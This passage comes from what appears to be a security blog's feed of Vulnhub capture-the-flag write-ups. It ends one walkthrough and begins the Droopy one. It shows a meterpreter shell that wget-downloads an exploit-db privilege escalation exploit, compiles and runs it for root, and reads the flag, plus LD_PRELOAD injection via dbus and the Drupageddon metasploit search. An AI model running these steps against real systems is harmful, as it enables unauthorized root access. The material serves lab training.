&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="nv"&gt;dbus&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="k"&gt;send&lt;/span&gt; &lt;span class="o"&gt;--&lt;/span&gt;&lt;span class="nv"&gt;print&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="nv"&gt;reply&lt;/span&gt; &lt;span class="o"&gt;--&lt;/span&gt;&lt;span class="nv"&gt;system&lt;/span&gt; &lt;span class="o"&gt;--&lt;/span&gt;&lt;span class="nv"&gt;dest&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="nv"&gt;com&lt;/span&gt;.&lt;span class="nv"&gt;ubuntu&lt;/span&gt;.&lt;span class="nv"&gt;USBCreator&lt;/span&gt; &lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="nv"&gt;com&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="nv"&gt;ubuntu&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="nv"&gt;USBCreator&lt;/span&gt; &lt;span class="nv"&gt;com&lt;/span&gt;.&lt;span class="nv"&gt;ubuntu&lt;/span&gt;.&lt;span class="nv"&gt;USBCreator&lt;/span&gt;.&lt;span class="nv"&gt;KVMTest&lt;/span&gt; &lt;span class="nv"&gt;string&lt;/span&gt;:&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="nv"&gt;dev&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="nv"&gt;sda&lt;/span&gt; &lt;span class="nv"&gt;dict&lt;/span&gt;:&lt;span class="nv"&gt;string&lt;/span&gt;:&lt;span class="nv"&gt;string&lt;/span&gt;:&lt;span class="nv"&gt;DISPLAY&lt;/span&gt;,&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="s"&gt;foo&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;,&lt;span class="nv"&gt;XAUTHORITY&lt;/span&gt;,&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="s"&gt;foo&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;,&lt;span class="nv"&gt;LD_PRELOAD&lt;/span&gt;,&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="s"&gt;/tmp/test.so&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="nv"&gt;Error&lt;/span&gt; &lt;span class="nv"&gt;org&lt;/span&gt;.&lt;span class="nv"&gt;freedesktop&lt;/span&gt;.&lt;span class="nv"&gt;DBus&lt;/span&gt;.&lt;span class="nv"&gt;Error&lt;/span&gt;.&lt;span class="nv"&gt;ServiceUnknown&lt;/span&gt;: &lt;span class="nv"&gt;The&lt;/span&gt; &lt;span class="nv"&gt;name&lt;/span&gt; &lt;span class="nv"&gt;com&lt;/span&gt;.&lt;span class="nv"&gt;ubuntu&lt;/span&gt;.&lt;span class="nv"&gt;USBCreator&lt;/span&gt; &lt;span class="nv"&gt;was&lt;/span&gt; &lt;span class="nv"&gt;not&lt;/span&gt; &lt;span class="nv"&gt;provided&lt;/span&gt; &lt;span class="nv"&gt;by&lt;/span&gt; &lt;span class="nv"&gt;any&lt;/span&gt; .&lt;span class="nv"&gt;service&lt;/span&gt; &lt;span class="nv"&gt;files&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h3 id="cve-2015-1318-cve-2015-1862"&gt;CVE-2015-1318 + CVE-2015-1862&lt;/h3&gt;
&lt;p&gt;&lt;a href="https://www.exploit-db.com/exploits/36746/"&gt;The CVE-2015-1318 + CVE-2015-1862&lt;/a&gt;
exploit a feature in ubuntu 14.04 allowing a user to forward crash reports
(&lt;a href="http://exploiterz.blogspot.fr/2015/04/2015-cve-1318-leading-to-privilege.html"&gt;more informations here&lt;/a&gt;).
I download the exploit, compiled it with &lt;code&gt;-static&lt;/code&gt; and run it to get a root
shell on the box:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="n"&gt;meterpreter&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;shell&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;Process&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;1550&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;created&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;Channel&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;9&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;created&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;cd&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;tmp&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;wget&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;https&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="o"&gt;//&lt;/span&gt;&lt;span class="n"&gt;www&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;exploit&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;db&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;com&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;download&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="mi"&gt;36746&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="o"&gt;--&lt;/span&gt;&lt;span class="mi"&gt;2016&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;05&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;11&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;11&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;22&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;39&lt;/span&gt;&lt;span class="o"&gt;--&lt;/span&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="n"&gt;https&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="o"&gt;//&lt;/span&gt;&lt;span class="n"&gt;www&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;exploit&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;db&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;com&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;download&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="mi"&gt;36746&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;Resolving&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;www&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;exploit&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;db&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;com&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;www&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;exploit&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;db&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;com&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;...&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mf"&gt;192.124&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="mf"&gt;249.8&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;Connecting&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;to&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;www&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;exploit&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;db&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;com&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;www&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;exploit&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;db&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;com&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="mf"&gt;192.124&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="mf"&gt;249.8&lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mf"&gt;443.&lt;/span&gt;&lt;span class="o"&gt;..&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;connected&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;HTTP&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;request&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;sent&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;awaiting&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;response&lt;/span&gt;&lt;span class="o"&gt;...&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;200&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;OK&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;Length&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;5216&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mf"&gt;5.1&lt;/span&gt;&lt;span class="n"&gt;K&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;application&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;txt&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;Saving&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;to&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;36746&amp;#39;&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="n"&gt;K&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;.....&lt;/span&gt;&lt;span class="w"&gt;                                                 &lt;/span&gt;&lt;span class="mi"&gt;100&lt;/span&gt;&lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="mi"&gt;337&lt;/span&gt;&lt;span class="n"&gt;M&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="mi"&gt;2016&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;05&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;11&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;11&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;22&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;43&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;337&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;MB&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;36746&amp;#39;&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;saved&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;5216&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="mi"&gt;5216&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;mv&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;36746&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;newpid&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;c&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;gcc&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="k"&gt;static&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;newpid&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;c&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;newpid&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;c&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;17&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;3&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;warning&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="c1"&gt;#warning this file must be compiled with -static [-Wcpp]&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="c1"&gt;# warning this file must be compiled with -static&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="o"&gt;^&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="o"&gt;./&lt;/span&gt;&lt;span class="n"&gt;a&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;out&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;uid&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;root&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;gid&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;33&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;www&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;data&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;groups&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;root&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt;&lt;span class="mi"&gt;33&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;www&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;data&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;id&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;uid&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;root&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;gid&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;33&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;www&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;data&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;groups&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;root&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt;&lt;span class="mi"&gt;33&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;www&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;data&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h2 id="conclusion"&gt;Conclusion&lt;/h2&gt;
&lt;p&gt;We just need to get our hands on the flag to finish it.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;cat /root/flag.txt&lt;/span&gt;
&lt;span class="code-line"&gt;U wyn teh Interwebs!!1eleven11!!1!&lt;/span&gt;
&lt;span class="code-line"&gt;Hack the planet&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;It was a nice box with still not so much web exploitation and only one exploit
to launch to get to root.
Thanks to &lt;a href="https://twitter.com/@RobertWinkel"&gt;Robert Winkel&lt;/a&gt; for the box and as
always to Vulnhub for their work.&lt;/p&gt;</content><category term="security"></category><category term="msfvenom"></category><category term="security"></category><category term="vulnhub"></category><category term="metasploit"></category><category term="boot2root"></category><category term="linux"></category></entry><entry><title>Vulnhub Droopy</title><link href="https://maggick.fr/2016/05/vulnhub-droopy.html" rel="alternate"></link><published>2016-05-10T21:49:00+02:00</published><updated>2016-05-10T21:49:00+02:00</updated><author><name>maggick</name></author><id>tag:maggick.fr,2016-05-10:/2016/05/vulnhub-droopy.html</id><summary type="html">&lt;p&gt;&lt;img alt="Droopy homepage" class="align-left" src="/media/2016.05/droopy.png" width="162"/&gt;
A few days ago, I installed a new pentesting box based on Arch Linux with Kali&lt;/p&gt;
&lt;p&gt;in a virtual machine. In order to test it I select a light vulnbox on vulnhub :
&lt;a href="https://www.vulnhub.com/entry/droopy-v02,143/"&gt;Droopy&lt;/a&gt;.
There were two hints on the description of the machine on the vulnhub download
page:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Grab a copy of the rockyou wordlist.&lt;/li&gt;
&lt;li&gt;It's fun to read other people's email.&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;We will see how to use them in a moment :)&lt;/p&gt;
</summary><content type="html">&lt;p&gt;&lt;img class="align-left"
src="/media/2016.05/droopy.png" alt="Droopy homepage" width="162"&gt;
A few days ago, I installed a new pentesting box based on Arch Linux with Kali&lt;/p&gt;
&lt;p&gt;in a virtual machine. In order to test it I select a light vulnbox on vulnhub :
&lt;a href="https://www.vulnhub.com/entry/droopy-v02,143/"&gt;Droopy&lt;/a&gt;.
There were two hints on the description of the machine on the vulnhub download
page:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Grab a copy of the rockyou wordlist.&lt;/li&gt;
&lt;li&gt;It's fun to read other people's email.&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;We will see how to use them in a moment :)&lt;/p&gt;


&lt;h2 id="discovery"&gt;Discovery&lt;/h2&gt;
&lt;p&gt;Our nmap scan give us nothing but an open 80 port running a HTTP server.
Let's give a look to the website:&lt;/p&gt;
&lt;p&gt;&lt;img alt="Droopy homepage" src="/media/2016.05/droopy.png"&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href="https://wappalyzer.com/"&gt;Wappalyzer&lt;/a&gt; give use the precise version of the Drupal
used (with the name and to logo of the VM it is easy to deduce that this is a
Drupal machine). The version is Drupal 7.0 which is vulnerable to CVE-2014-3704
also called
&lt;a href="https://www.rapid7.com/db/modules/exploit/multi/http/drupal_drupageddon"&gt;drupal_drupageddon&lt;/a&gt;.&lt;/p&gt;
&lt;h2 id="exploit"&gt;Exploit&lt;/h2&gt;
&lt;p&gt;We use metasploit to directly have the Drupal exploit AND directly a
meterpreter:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="n"&gt;msf&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;search&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;drupal&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="o"&gt;!&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;Module&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;database&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;cache&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="ow"&gt;not&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;built&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;yet&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;using&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;slow&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;search&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;Matching&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;Modules&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="o"&gt;================&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="n"&gt;Name&lt;/span&gt;&lt;span class="w"&gt;                                           &lt;/span&gt;&lt;span class="n"&gt;Disclosure&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;Date&lt;/span&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="n"&gt;Rank&lt;/span&gt;&lt;span class="w"&gt;       &lt;/span&gt;&lt;span class="n"&gt;Description&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="o"&gt;----&lt;/span&gt;&lt;span class="w"&gt;                                           &lt;/span&gt;&lt;span class="o"&gt;---------------&lt;/span&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="o"&gt;----&lt;/span&gt;&lt;span class="w"&gt;       &lt;/span&gt;&lt;span class="o"&gt;-----------&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="n"&gt;auxiliary&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;gather&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;drupal_openid_xxe&lt;/span&gt;&lt;span class="w"&gt;             &lt;/span&gt;&lt;span class="mi"&gt;2012&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;10&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;17&lt;/span&gt;&lt;span class="w"&gt;       &lt;/span&gt;&lt;span class="n"&gt;normal&lt;/span&gt;&lt;span class="w"&gt;     &lt;/span&gt;&lt;span class="n"&gt;Drupal&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;OpenID&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;External&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;Entity&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;Injection&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
